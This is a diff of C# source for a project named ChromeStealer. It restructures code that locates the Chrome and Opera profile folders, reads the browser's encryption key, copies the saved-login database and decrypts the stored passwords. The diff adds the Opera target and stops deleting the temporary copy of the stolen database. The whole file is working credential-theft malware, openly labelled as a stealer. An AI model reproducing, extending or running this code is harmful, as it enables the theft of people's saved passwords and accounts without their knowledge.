@@ -1,35 +1,47 @@
 ﻿using System;
-using System.Buffers.Binary;
 using System.Collections.Generic;
+using System.Collections.ObjectModel;
 using System.Data;
 using System.Data.SQLite;
 using System.Diagnostics;
 using System.IO;
-using ChromeStealer.Models;
 using System.Security.Cryptography;
 using System.Text;
+using ChromeStealer.Models;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 
-namespace ChromeStealer
+namespace ChromeStealer.Stealer
 {
-    public static class ChromeDataRepository
+    public abstract class BaseDataStealer
     {
-        private static string LocalAppDataFolder => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-
-        private static readonly string UserDataFolderPath = Path.Combine(LocalAppDataFolder, 
-            "Google", "Chrome", "User Data/");
-
-        private static readonly string LoginDataFilePath = Path.Combine(UserDataFolderPath, "Default", "Login Data");
-
-        private static readonly string LocalStateFilePath = Path.Combine(UserDataFolderPath, "Local State");
-
-        private static readonly string LoginDataTempFilePath =
-            Path.Combine(Environment.CurrentDirectory, "chr_temp.db");
+        public static IReadOnlyCollection<BaseDataStealer> Stealers => 
+            new ReadOnlyCollection<BaseDataStealer>(new List<BaseDataStealer>
+        {
+            new ChromeStealer(),
+            new OperaStealer()
+        });
         
-        private static readonly AesGcm AesInstance;
+        private static readonly Random Random = new();
+        
+        protected string LocalAppDataFolder => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        protected string RoamingAppDataFolder => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
-        private static byte[] GetCryptKey()
+        protected abstract string UserDataFolderPath { get; }
+
+        protected abstract string LoginDataFilePath { get; }
+
+        protected abstract string LocalStateFilePath { get; }
+
+        public static readonly string TempFolderPath = 
+            Path.Combine(Environment.CurrentDirectory, "temp");
+
+        private readonly string LoginDataTempFilePath =
+            Path.Combine(TempFolderPath, $"{Guid.NewGuid()}.db");
+        
+        private readonly AesGcm AesInstance;
+
+        private byte[] GetCryptKey()
         {
             var localStateRaw = File.ReadAllText(LocalStateFilePath);
             var localState = JsonConvert.DeserializeObject<JObject>(localStateRaw);
@@ -40,14 +52,21 @@ namespace ChromeStealer
             return decryptedKey;
         }
 
-        private static readonly byte[] EncryptedKey = GetCryptKey();
-
-        static ChromeDataRepository()
+        static BaseDataStealer()
         {
-            AesInstance = new AesGcm(EncryptedKey);
+            if (!Directory.Exists(TempFolderPath))
+            {
+                Directory.CreateDirectory(TempFolderPath);
+            }
         }
 
-        private static string DecryptPassword(byte[] encryptedPassword)
+        protected BaseDataStealer()
+        {
+            var encryptedKey = GetCryptKey();
+            AesInstance = new AesGcm(encryptedKey);
+        }
+
+        private string DecryptPassword(byte[] encryptedPassword)
         {
             var encryptedPasswordSpan = new Span<byte>(encryptedPassword);
             
@@ -66,11 +85,15 @@ namespace ChromeStealer
             return plainText;
         }
 
-        public static List<LoginData> GetLoginData()
+        public List<LoginData> GetLoginData()
         {
             var loginData = new List<LoginData>();
             
-            File.Copy(LoginDataFilePath, LoginDataTempFilePath, true);
+            var loginDataFileInfo = new FileInfo(LoginDataFilePath);
+            if (!loginDataFileInfo.Exists) return new List<LoginData>();
+            
+            loginDataFileInfo.CopyTo(LoginDataTempFilePath, true);
+            
             var dataTable = new DataTable();
             using (var dbConnection = new SQLiteConnection($@"Data Source={LoginDataTempFilePath};Version=3;New=True;Compress=True;"))
             {
@@ -125,14 +148,14 @@ namespace ChromeStealer
             
             Console.WriteLine($"Passwords stealed: {passwordsCount.Successes}, empty: {passwordsCount.Empty}, fails: {passwordsCount.Fails}.");
 
-            try
-            {
-                File.Delete(LoginDataTempFilePath);
-            }
-            catch (Exception exception)
-            {
-                Console.WriteLine($"Unable to delete temp database file:\n{exception}");
-            }
+            // try
+            // {
+            //     File.Delete(LoginDataTempFilePath);
+            // }
+            // catch (Exception exception)
+            // {
+            //     Console.WriteLine($"Unable to delete temp database file:\n{exception}");
+            // }
             
             return loginData;
         }
